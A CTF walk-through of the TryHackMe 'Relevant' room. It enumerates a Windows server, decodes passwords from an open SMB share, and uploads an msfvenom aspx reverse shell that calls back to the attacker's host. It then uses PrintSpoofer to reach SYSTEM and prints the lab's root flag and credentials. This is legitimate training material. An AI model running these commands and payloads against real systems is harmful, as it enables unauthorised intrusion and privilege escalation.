---
title: "Walk-through of Relevant from TryHackMe"
header:
  teaser: /assets/images/2021-03-01-22-57-12.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Windows
  - SMB
  - SMBMap
  - PrintSpoofer 
---

## Machine Information

![relevant](/assets/images/2021-03-01-22-57-12.png)

Relevant is rated as a medium difficulty room on TryHackMe. We have no information given in the room description, but after enumerating ports we find we are dealing with a Windows 2016 server. There is an anonymous SMB share which we find is also accessible from an IIS server running on an alternate port. From there we upload a reverse shell to gain a foothold, then use the PrintSpoofer exploit to escalate to system level access.
<!--more-->

Skills required are basic port enumeration and exploration knowledge. Skills learned are abusing poorly configured IIS web servers and finding relevant exploits for escalation.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - Relevant](https://tryhackme.com/room/relevant) |
| Machine Release Date | 24th July 2020 |
| Date I Completed It | 28th Feb 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

As always, let's start with Nmap to check for open ports:

```text
root@kali:/home/kali/thm/relevant# ports=$(nmap -p- --min-rate=1000 -T4 10.10.218.231 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:/home/kali/thm/relevant# nmap -p$ports -sC -sV -oA relevant 10.10.218.231
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-28 21:36 GMT
Nmap scan report for 10.10.218.231
Host is up (0.051s latency).

PORT      STATE SERVICE        VERSION
80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_System_Time: 2021-02-28T21:38:22+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-02-27T21:33:27
|_Not valid after:  2021-08-29T21:33:27
|_ssl-date: 2021-02-28T21:39:03+00:00; +1s from scanner time.
49663/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:           
|_clock-skew: mean: 1h36m01s, deviation: 3h34m40s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-02-28T13:38:22-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-28T21:38:25
|_  start_date: 2021-02-28T21:34:05

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.60 seconds
```

The scan reveals this is clearly a Windows 2016 server. We see a number of open ports, interestingly IIS is on both port 80 and 49663. We also see SMB on 445, which is where we'll start:

## SMB Enumeration

```text
root@kali:/home/kali/thm/relevant# smbmap -u root -H 10.10.218.231
[+] Guest session       IP: 10.10.218.231:445   Name: 10.10.218.231                                     
        Disk                                 Permissions     Comment
        ----                                 -----------     -------
        ADMIN$                               NO ACCESS       Remote Admin
        C$                                   NO ACCESS       Default share
        IPC$                                 READ ONLY       Remote IPC
        nt4wrksv                             READ, WRITE
```

We find an interesting share that is accessible without valid credentials, let's have a further look:

```test
root@kali:/home/kali/thm/relevant# smbmap -u root -H 10.10.218.231 -r nt4wrksv
[+] Guest session       IP: 10.10.218.231:445   Name: 10.10.218.231                                     
        Disk                                 Permissions     Comment
        ----                                 -----------     -------
        nt4wrksv                             READ, WRITE
        .\nt4wrksv\*
        dr--r--r--                0 Sun Feb 28 22:04:01 2021    .
        dr--r--r--                0 Sun Feb 28 22:04:01 2021    ..
        fr--r--r--               98 Sat Jul 25 16:35:44 2020    passwords.txt
```

That file also looks interesting, let's grab it:

```text
root@kali:/home/kali/thm/relevant# smbmap -u root -H 10.10.218.231 -r nt4wrksv -A 'pass'
[+] Guest session       IP: 10.10.218.231:445   Name: 10.10.218.231                                     
[+] Starting search for files matching 'pass' on share nt4wrksv.
[+] Match found! Downloading: nt4wrksv\passwords.txt
```

Let's have a look at it:

```text
root@kali:/home/kali/thm/relevant# cat 10.10.218.231-nt4wrksv_passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

They look like base64 encoded strings, let's try and decode:

```text
root@kali:/home/kali/thm/relevant# echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
Bob - !P@$$W0rD!123
root@kali:/home/kali/thm/relevant# echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

## Webserver Enumeration

Excellent, we look to have found some credentials. Unfortunatley I spent some time trying them with SMB and remotely with PSExec, but no dice. Maybe we'll find a use for them later, let's check out the web servers:

![relevant-homepage](/assets/images/2021-02-28-22-24-46.png)

We just see the default IIS install page for both port 80 and 49663. I tried gobuster on port 80 but found nothing, then I tried port 46993 and found a folder with the same name as the SMB share:

```text
root@kali:/home/kali/thm/relevant# gobuster -t 50 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.218.231:49663
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.218.231:49663
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/01 22:13:16 Starting gobuster
===============================================================
http://10.10.105.152:49663/nt4wrksv (Status: 301)
===============================================================
2021/03/01 22:23:27 Finished
===============================================================
```

Let's see if we can get to the passwords.txt file:

![relevant-nt4wrksv](/assets/images/2021-02-28-22-32-49.png)

We can, let's try uploading a file via SMB and then see if we can get to that via the browser:

```text
root@kali:/home/kali/thm/relevant# echo "hello world from pencer.io" > test.txt

root@kali:/home/kali/thm/relevant# smbmap -u root -H 10.10.218.231 -r nt4wrksv --upload test.txt nt4wrksv/test.txt 
[+] Starting upload: test.txt (27 bytes)
[+] Upload complete.
```

File uploaded, now check we can get to it:

![relevant-upload](/assets/images/2021-02-28-22-41-49.png)

## Reverse Shell

That also works, let's see if we can get an aspx reverse shell working. Use MSFVenom to create our payload:

```text
root@kali:/home/kali/thm/relevant# msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.165.116 lport=1337 -f aspx -o revshell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 200262 bytes
Final size of aspx file: 1010424 bytes
Saved as: revshell.aspx
```

Upload via SMB:

```text
root@kali:/home/kali/thm/relevant# smbmap -u root -H 10.10.218.231 -r nt4wrksv --upload revshell.aspx nt4wrksv/revshell.aspx
[+] Starting upload: revshell.aspx (1010424 bytes)
[+] Upload complete.
```

Start Netcat listening to catch the shell:

```text
root@kali:/home/kali/thm/relevant# nc -nlvp 1337
listening on [any] 1337 ...
```

Now browse to the file:

![relevant-revshell](/assets/images/2021-03-01-23-06-21.png)

## User Flag

Switch back to Kali, and we have a connection:

```text
root@kali:/home/kali/thm/relevant# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.218.231] 49839
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\winsows\system32\inetsrv>
```

Check who we are connected as:

```text
c:\winsows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

Let's see if we can get to the user flag:

```text
c:\>cd c:\Users\Bob\Desktop
c:\Users\Bob\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5
 Directory of c:\Users\Bob\Desktop

03/01/2021  10:54 PM    <DIR>          .
03/01/2021  10:54 PM    <DIR>          ..
03/01/2021  10:54 AM                35 user.txt

c:\Users\Bob\Desktop>type user.txt
<HIDDEN>
```

## Root Flag

That worked. On to root, let's check our privileges:

```text
c:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Interesting that we have SeImpersonatePrivilege. If you Google exploits for that you will find one called [PrintSpoofer](https://github.com/dievus/printspoofer), which is nice and simple to use.

Let's grab the exploit and upload via SMB:

```text
root@kali:/home/kali/thm/relevant# wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
--2021-03-01 22:36:38--  https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/dievus/printspoofer/master/PrintSpoofer.exe [following]
--2021-03-01 22:36:39--  https://raw.githubusercontent.com/dievus/printspoofer/master/PrintSpoofer.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: ‘PrintSpoofer.exe’
PrintSpoofer.exe                                           100%[=========================>]  26.50K  --.-KB/s    in 0.006s  
2021-03-01 22:36:39 (4.61 MB/s) - ‘PrintSpoofer.exe’ saved [27136/27136]

root@kali:/home/kali/thm/relevant# smbmap -u root -H 10.10.218.231 -r nt4wrksv --upload PrintSpoofer.exe nt4wrksv/PrintSpoofer.exe
[+] Starting upload: PrintSpoofer.exe (27136 bytes)
[+] Upload complete.
```

Now we just execute it from our existing shell on the server:

```text
c:\>cd \inetpub\wwwroot\nt4wrksv
c:\inetpub\wwwroot\nt4wrksv>dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5
 Directory of c:\inetpub\wwwroot\nt4wrksv
03/01/2021  11:24 PM    <DIR>          .
03/01/2021  11:24 PM    <DIR>          ..
03/01/2021  11:24 AM                98 passwords.txt
03/01/2021  11:24 PM            27,136 PrintSpoofer.exe
03/01/2021  11:24 PM         1,010,424 revshell.aspx

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

That was nice and easy! All we need to do now is grab the root flag:

```text
C:\Windows\system32> cd \users\administrator\desktop
C:\users\administrator\desktop> cat root.txt
cat root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```

All done. See you next time.
